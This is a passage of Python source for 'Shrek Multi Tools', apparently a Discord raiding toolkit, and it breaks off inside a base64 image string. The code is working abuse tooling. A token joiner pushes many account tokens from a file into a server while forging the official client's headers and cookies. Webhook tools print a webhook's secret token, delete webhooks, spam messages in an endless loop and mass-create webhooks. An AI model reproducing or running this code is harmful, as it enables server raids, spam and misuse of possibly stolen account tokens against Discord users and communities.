        elif optionsforpfp == 2:
            r = requests.patch(url,headers=header,json=payload2)
            if r.status_code == 200:
                print(Fore.WHITE + f'Done! added pfp to {token[x]}')
            else:
                print(r)

        elif optionsforpfp == 3:
            r = requests.patch(url,headers=header,json=payload3)
            if r.status_code == 200:
                print(Fore.WHITE + f'Done! added pfp to {token[x]}')
            else:
                print(r)

        else:
            print("Error")

  global joiner
  def joiner():
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Token Joiner")
      print(f'''
{Fore.GREEN}
▓███████▓ ▒█████   ▀██ ▄█▀▓█████ ███▄    █      ▄████▀▀ ▒█████    ██ ███▄    █ ▓█████ ██▀███  
▓  ██▒ ▓▒▒██▒  ██▒  ██▄█▒ ▓█   ▀ ██ ▀█   █        ▒██  ▒██▒  ██▒▒▓██ ██ ▀█   █ ▓█   ▀▓██ ▒ ██▒
▒ ▓██░ ▒░▒██░  ██▒ ▓███▄░ ▒███  ▓██  ▀█ ██▒       ░██  ▒██░  ██▒░▒██▓██  ▀█ ██▒▒███  ▓██ ░▄█ ▒
░ ▓██▓ ░ ▒██   ██░ ▓██ █▄ ▒▓█  ▄▓██▒  ▐▌██▒    ▓██▄██▓ ▒██   ██░ ░██▓██▒  ▐▌██▒▒▓█  ▄▒██▀▀█▄  
  ▒██▒ ░ ░ ████▓▒░ ▒██▒ █▄░▒████▒██░   ▓██░     ▓███▒  ░ ████▓▒░ ░██▒██░   ▓██░░▒████░██▓ ▒██▒
  ▒ ░░   ░ ▒░▒░▒░  ▒ ▒▒ ▓▒░░ ▒░ ░ ▒░   ▒ ▒      ▒▓▒▒░  ░ ▒░▒░▒░  ░▓ ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒▓ ░▒▓░
    ░      ░ ▒ ▒░  ░ ░▒ ▒░ ░ ░  ░ ░░   ░ ▒░     ▒ ░▒░    ░ ▒ ▒░   ▒ ░ ░░   ░ ▒░ ░ ░    ░▒ ░ ▒░
  ░ ░    ░ ░ ░ ▒   ░ ░░ ░    ░     ░   ░ ░      ░ ░ ░  ░ ░ ░ ▒    ▒    ░   ░ ░    ░     ░   ░ 
             ░ ░   ░  ░      ░           ░      ░   ░      ░ ░    ░          ░    ░     ░     


      ''')
      tokens = []
      token = []

      with open('tokens.txt','r') as f:
        for line in f:
          tokens.append(line)

        for element in tokens:
          token.append(element.strip())

      length = len(token)

      invite = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What is the invite of the server you want to join? (Only Code): ''')
      invite.replace('https://discord.gg/','')
      invite.replace('discord.gg/','')

      url = f'https://discord.com/api/v9/invites/{invite}'

      for x in range(length):
          header = {
              "authority": "discord.com",
              "scheme": "https",
              "accept": "*/*",
              "accept-encoding": "gzip, deflate, br",
              "accept-language": "en-US",
              "Authorization": f'{token[x]}',
              "content-length": "0",
              "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
              "origin": "https://discord.com",
              'referer': 'https://discord.com/channels/@me',
              "sec-fetch-dest": "empty",
              "sec-fetch-mode": "cors",
              "sec-fetch-site": "same-origin",
              "user-agent": useragent(),
              "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
              "x-debug-options": "bugReporterEnabled",
              "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
          }

          r = requests.post(url, headers=header)
          if r.status_code == 200:
              print(f'Joined With {token[x]}!')
          else:
              print("Error")

  def webhooks():
    global options2
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Webhook Raiders")
    options2 = input(f'''
{Fore.GREEN}
 █     █░▓█████  ▄▄▄▄     ██░ ██  ▒█████   ▒█████   ▀██ ▄█▀     ██▀███   ▄▄▄       ██ ▓█████▄ ▓█████ ██▀███  
▓█░ █ ░█░▓█   ▀ ▓█████▄ ▒▓██░ ██ ▒██▒  ██▒▒██▒  ██▒  ██▄█▒     ▓██ ▒ ██▒▒████▄   ▒▓██ ▒██▀ ██▌▓█   ▀▓██ ▒ ██▓
▒█░ █ ░█ ▒███   ▒██▒ ▄██░▒██▀▀██ ▒██░  ██▒▒██░  ██▒ ▓███▄░     ▓██ ░▄█ ▒▒██  ▀█▄ ░▒██ ░██   █▌▒███  ▓██ ░▄█ ▒
░█░ █ ░█ ▒▓█  ▄ ▒██░█▀   ░▓█ ░██ ▒██   ██░▒██   ██░ ▓██ █▄     ▒██▀▀█▄  ░██▄▄▄▄██ ░██▒░▓█▄   ▌▒▓█  ▄▒██▀▀█▄  
░░██▒██▓ ░▒████▒░▓█  ▀█▓ ░▓█▒░██▓░ ████▓▒░░ ████▓▒░ ▒██▒ █▄    ░██▓ ▒██▒ ▓█   ▓██ ░██░░▒████▓ ░▒████░██▓ ▒██▒
░ ▓░▒ ▒  ░░ ▒░ ░░▒▓███▀▒  ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ▒▒ ▓▒    ░ ▒▓ ░▒▓░ ▒▒   ▓▒█ ░▓ ░ ▒▒▓  ▒ ░░ ▒░ ░ ▒▓ ░▒▓░
  ▒ ░ ░   ░ ░  ░▒░▒   ░   ▒ ░▒░ ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ░▒ ▒░      ░▒ ░ ▒░  ░   ▒▒   ▒   ░ ▒  ▒  ░ ░    ░▒ ░ ▒░
  ░   ░     ░    ░    ░   ░  ░░ ░░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░░ ░        ░   ░   ░   ▒    ▒   ░ ░  ░    ░     ░   ░ 
    ░       ░  ░ ░        ░  ░  ░    ░ ░      ░ ░   ░  ░          ░           ░    ░     ░       ░     ░     



  {Fore.GREEN}[{Fore.WHITE}01{Fore.GREEN}] {Fore.WHITE}CHECK WEBHOOK
  {Fore.GREEN}[{Fore.WHITE}02{Fore.GREEN}] {Fore.WHITE}WEBHOOK INFO
  {Fore.GREEN}[{Fore.WHITE}03{Fore.GREEN}] {Fore.WHITE}DELETE WEBHOOK
  {Fore.GREEN}[{Fore.WHITE}04{Fore.GREEN}] {Fore.WHITE}SPAM WEBHOOK
  {Fore.GREEN}[{Fore.WHITE}05{Fore.GREEN}] {Fore.WHITE}CREATE WEBHOOKS
  {Fore.GREEN}[{Fore.WHITE}06{Fore.GREEN}] {Fore.WHITE}CREATE + SPAM WEBHOOKS
  {Fore.GREEN}[{Fore.WHITE}00{Fore.GREEN}] EXIT

    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE}''')


    if options2 in ['1','01']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Webhook Checker")
      hookcheck = print(f'''
{Fore.GREEN}
 █     █░▓█████  ▄▄▄▄     ██░ ██  ▒█████   ▒█████   ▀██ ▄█▀     ▄████▄   ██░ ██ ▓█████ ▀██ ▄█▀▓█████ ██▀███  
▓█░ █ ░█░▓█   ▀ ▓█████▄ ▒▓██░ ██ ▒██▒  ██▒▒██▒  ██▒  ██▄█▒     ▒██▀ ▀█ ▒▓██░ ██ ▓█   ▀  ██▄█▒ ▓█   ▀▓██ ▒ ██▒
▒█░ █ ░█ ▒███   ▒██▒ ▄██░▒██▀▀██ ▒██░  ██▒▒██░  ██▒ ▓███▄░     ▒▓█    ▄░▒██▀▀██ ▒███   ▓███▄░ ▒███  ▓██ ░▄█ ▒
░█░ █ ░█ ▒▓█  ▄ ▒██░█▀   ░▓█ ░██ ▒██   ██░▒██   ██░ ▓██ █▄     ▒▓▓▄ ▄██ ░▓█ ░██ ▒▓█  ▄ ▓██ █▄ ▒▓█  ▄▒██▀▀█▄  
░░██▒██▓ ░▒████▒░▓█  ▀█▓ ░▓█▒░██▓░ ████▓▒░░ ████▓▒░ ▒██▒ █▄    ▒ ▓███▀  ░▓█▒░██▓░▒████ ▒██▒ █▄░▒████░██▓ ▒██▒
░ ▓░▒ ▒  ░░ ▒░ ░░▒▓███▀▒  ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ▒▒ ▓▒    ░ ░▒ ▒    ▒ ░░▒░▒░░ ▒░  ▒ ▒▒ ▓▒░░ ▒░ ░ ▒▓ ░▒▓░
  ▒ ░ ░   ░ ░  ░▒░▒   ░   ▒ ░▒░ ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ░▒ ▒░      ░  ▒    ▒ ░▒░ ░ ░ ░   ░ ░▒ ▒░ ░ ░    ░▒ ░ ▒░
  ░   ░     ░    ░    ░   ░  ░░ ░░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░░ ░     ░         ░  ░░ ░   ░   ░ ░░ ░    ░     ░   ░ 
    ░       ░  ░ ░        ░  ░  ░    ░ ░      ░ ░   ░  ░       ░ ░       ░  ░  ░   ░   ░  ░      ░     ░     


      ''')

      hookcheck = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What is your webhook link?: ''')
      r = requests.get(hookcheck)
      if r.status_code == 200:
        print("Valid Webhook Link!")
      else:
        print("Webhook Link Not Valid!")

    elif options2 in ['2','02']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Webhook Information")
      options3 = print(f'''
      {Fore.GREEN}
 █     █░▓█████  ▄▄▄▄     ██░ ██  ▒█████   ▒█████   ▀██ ▄█▀      ██ ███▄    █    █████ ▒█████  
▓█░ █ ░█░▓█   ▀ ▓█████▄ ▒▓██░ ██ ▒██▒  ██▒▒██▒  ██▒  ██▄█▒     ▒▓██ ██ ▀█   █  ▓██    ▒██▒  ██▒
▒█░ █ ░█ ▒███   ▒██▒ ▄██░▒██▀▀██ ▒██░  ██▒▒██░  ██▒ ▓███▄░     ░▒██▓██  ▀█ ██▒ ▒████  ▒██░  ██▒
░█░ █ ░█ ▒▓█  ▄ ▒██░█▀   ░▓█ ░██ ▒██   ██░▒██   ██░ ▓██ █▄      ░██▓██▒  ▐▌██▒ ░▓█▒   ▒██   ██░
░░██▒██▓ ░▒████▒░▓█  ▀█▓ ░▓█▒░██▓░ ████▓▒░░ ████▓▒░ ▒██▒ █▄     ░██▒██░   ▓██░▒░▒█░   ░ ████▓▒░
░ ▓░▒ ▒  ░░ ▒░ ░░▒▓███▀▒  ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ▒▒ ▓▒     ░▓ ░ ▒░   ▒ ▒ ░ ▒ ░   ░ ▒░▒░▒░ 
  ▒ ░ ░   ░ ░  ░▒░▒   ░   ▒ ░▒░ ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ░▒ ▒░      ▒ ░ ░░   ░ ▒░░ ░       ░ ▒ ▒░ 
  ░   ░     ░    ░    ░   ░  ░░ ░░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░░ ░       ▒    ░   ░ ░   ░ ░   ░ ░ ░ ▒  
    ░       ░  ░ ░        ░  ░  ░    ░ ░      ░ ░   ░  ░         ░          ░ ░           ░ ░  

            ''')

      options3 = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What is your webhook link?: ''')
      print(Fore.RESET)
      r = requests.get(options3)
      print(f'{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Webhook Name: {Fore.WHITE}{r.json()["name"]}')
      print(f'{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Webhook ID: {Fore.WHITE}{r.json()["id"]}')
      print(f'{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Guild ID of Webhook: {Fore.WHITE}{r.json()["guild_id"]}')
      print(f'{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Channel ID of Webhook: {Fore.WHITE}{r.json()["channel_id"]}')
      if r.json()['avatar'] == 'null':
          print(f'{Fore.RESET}Avatar: {Fore.WHITE} None')
      else:
          avatar = f'https://cdn.discordapp.com/avatars/{r.json()["id"]}/{r.json()["avatar"]}'
          print(f'{Fore.RESET}Avatar: {Fore.WHITE}{avatar}')
      print(f'{Fore.RESET}Token of Webhook :{Fore.WHITE}{r.json()["token"]}')


    elif options2 in ['3','03']: 
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Webhook Deleter")
      print(f'''
  {Fore.GREEN}
 █     █░▓█████  ▄▄▄▄     ██░ ██  ▒█████   ▒█████   ▀██ ▄█▀     ▓█████▄ ▓█████ ██▓   ▓█████▄▄▄█████▓▓█████ ██▀███  
▓█░ █ ░█░▓█   ▀ ▓█████▄ ▒▓██░ ██ ▒██▒  ██▒▒██▒  ██▒  ██▄█▒      ▒██▀ ██▌▓█   ▀▓██▒   ▓█   ▀▓  ██▒ ▓▒▓█   ▀▓██ ▒ ██▒
▒█░ █ ░█ ▒███   ▒██▒ ▄██░▒██▀▀██ ▒██░  ██▒▒██░  ██▒ ▓███▄░      ░██   █▌▒███  ▒██░   ▒███  ▒ ▓██░ ▒░▒███  ▓██ ░▄█ ▒
░█░ █ ░█ ▒▓█  ▄ ▒██░█▀   ░▓█ ░██ ▒██   ██░▒██   ██░ ▓██ █▄     ▒░▓█▄   ▌▒▓█  ▄▒██░   ▒▓█  ▄░ ▓██▓ ░ ▒▓█  ▄▒██▀▀█▄  
░░██▒██▓ ░▒████▒░▓█  ▀█▓ ░▓█▒░██▓░ ████▓▒░░ ████▓▒░ ▒██▒ █▄    ░░▒████▓ ░▒████░██████░▒████  ▒██▒ ░ ░▒████░██▓ ▒██▒
░ ▓░▒ ▒  ░░ ▒░ ░░▒▓███▀▒  ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ▒▒ ▓▒    ░ ▒▒▓  ▒ ░░ ▒░ ░ ▒░▓  ░░ ▒░   ▒ ░░   ░░ ▒░ ░ ▒▓ ░▒▓░
  ▒ ░ ░   ░ ░  ░▒░▒   ░   ▒ ░▒░ ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ░▒ ▒░      ░ ▒  ▒  ░ ░  ░ ░ ▒   ░ ░      ░     ░ ░    ░▒ ░ ▒░
  ░   ░     ░    ░    ░   ░  ░░ ░░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░░ ░       ░ ░  ░    ░    ░ ░     ░    ░ ░       ░     ░   ░ 
    ░       ░  ░ ░        ░  ░  ░    ░ ░      ░ ░   ░  ░           ░       ░      ░     ░              ░     ░     


      ''')  
      web = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Webhook Link: ''')
      try:
        requests.delete(web)
        print("Webhook successfully deleted")
      except:
        print("Error deleting webhook")

    elif options2 in ['4','04']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Webhook Spammer")
      print(f"""
  {Fore.GREEN}
  ██████  ██▓███   ▄▄▄       ███▄ ▄███▓  ███▄ ▄███▓▓█████ ██▀███  
▒██    ▒ ▓██░  ██ ▒████▄    ▓██▒▀█▀ ██▒ ▓██▒▀█▀ ██▒▓█   ▀▓██ ▒ ██▒
░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░ ▓██    ▓██░▒███  ▓██ ░▄█ ▒
  ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██  ▒██    ▒██ ▒▓█  ▄▒██▀▀█▄  
▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒▒▒██▒   ░██▒░▒████░██▓ ▒██▒
▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░░░ ▒░   ░  ░░░ ▒░ ░ ▒▓ ░▒▓░
░ ░▒  ░  ░▒ ░       ░   ▒▒ ░░  ░      ░░░  ░      ░ ░ ░    ░▒ ░ ▒░
░  ░  ░  ░░         ░   ▒   ░      ░    ░      ░      ░     ░   ░ 
      ░                 ░  ░       ░   ░       ░      ░     ░     


      """)

      webhook = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Webhook Link: ''')
      message = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Message: ''')
      delay = float(input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Delay: '''))

      while True:
        try:
          time.sleep(delay)
          data = requests.post(webhook, json={'content': message})

          if data.status_code == 204:
            print(f"{message} sent!")
        except:
          print("Error, or wrong webhook: {}".format(webhook))
          time.sleep(delay)

    elif options2 in ['5','05']:  
        cls()
        ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Webhook Creator")
        print(f'''
{Fore.GREEN}
 █     █░▓█████  ▄▄▄▄     ██░ ██  ▒█████   ▒█████   ▀██ ▄█▀     ▄████▄  ██▀███  ▓█████ ▄▄▄     ▄▄▄█████▓ ▒█████   ██▀███  
▓█░ █ ░█░▓█   ▀ ▓█████▄ ▒▓██░ ██ ▒██▒  ██▒▒██▒  ██▒  ██▄█▒     ▒██▀ ▀█ ▓██ ▒ ██▒▓█   ▀▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒
▒█░ █ ░█ ▒███   ▒██▒ ▄██░▒██▀▀██ ▒██░  ██▒▒██░  ██▒ ▓███▄░     ▒▓█    ▄▓██ ░▄█ ▒▒███  ▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒
░█░ █ ░█ ▒▓█  ▄ ▒██░█▀   ░▓█ ░██ ▒██   ██░▒██   ██░ ▓██ █▄     ▒▓▓▄ ▄██▒██▀▀█▄  ▒▓█  ▄░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  
░░██▒██▓ ░▒████▒░▓█  ▀█▓ ░▓█▒░██▓░ ████▓▒░░ ████▓▒░ ▒██▒ █▄    ▒ ▓███▀ ░██▓ ▒██▒░▒████ ▓█   ▓██  ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒
░ ▓░▒ ▒  ░░ ▒░ ░░▒▓███▀▒  ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ▒▒ ▓▒    ░ ░▒ ▒  ░ ▒▓ ░▒▓░░░ ▒░  ▒▒   ▓▒█  ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
  ▒ ░ ░   ░ ░  ░▒░▒   ░   ▒ ░▒░ ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ░▒ ▒░      ░  ▒    ░▒ ░ ▒░ ░ ░    ░   ▒▒     ░      ░ ▒ ▒░   ░▒ ░ ▒░
  ░   ░     ░    ░    ░   ░  ░░ ░░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░░ ░     ░          ░   ░    ░    ░   ▒    ░ ░    ░ ░ ░ ▒     ░   ░ 
    ░       ░  ░ ░        ░  ░  ░    ░ ░      ░ ░   ░  ░       ░ ░        ░        ░        ░               ░ ░     ░     



        ''')

        chanid = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What is the channel id you want to make the webhooks in?: ''')
        tukan4 = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What is the token to use?: ''')

        print("Starting Now...")

        def spammer():

            url = f'https://discord.com/api/v9/channels/{chanid}/webhooks'

            global randstr

            def randstr(lenn):
                alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
                text = ''
                for i in range(0, lenn):
                    text += alpha[random.randint(0, len(alpha) - 1)]
                return text


            header = {
                "authority": "discord.com",
                "method": "POST",
                "path": f"/api/v9/channels/{chanid}/webhooks",
                "scheme": "https",
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US",
                "Authorization": f'{tukan4}',
                "content-length": "0",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                'referer': 'https://discord.com/channels/@me',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": useragent(),
                "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
            }




            url2 = "data:image/jpeg;base64,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